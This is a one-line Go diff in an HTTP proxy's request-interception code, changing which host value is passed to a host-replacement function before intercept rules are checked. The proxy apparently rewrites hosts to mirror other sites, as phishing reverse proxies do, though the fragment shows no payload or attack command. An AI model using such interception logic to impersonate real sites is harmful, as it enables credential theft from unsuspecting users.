@@ -852,7 +852,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 				// check if request should be intercepted
 				if pl != nil {
-					if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
+					if r_host, ok := p.replaceHostWithOriginal(o_host); ok {
 						for _, ic := range pl.intercept {
 							//log.Debug("ic.domain:%s r_host:%s", ic.domain, r_host)
 							//log.Debug("ic.path:%s path:%s", ic.path, req.URL.Path)
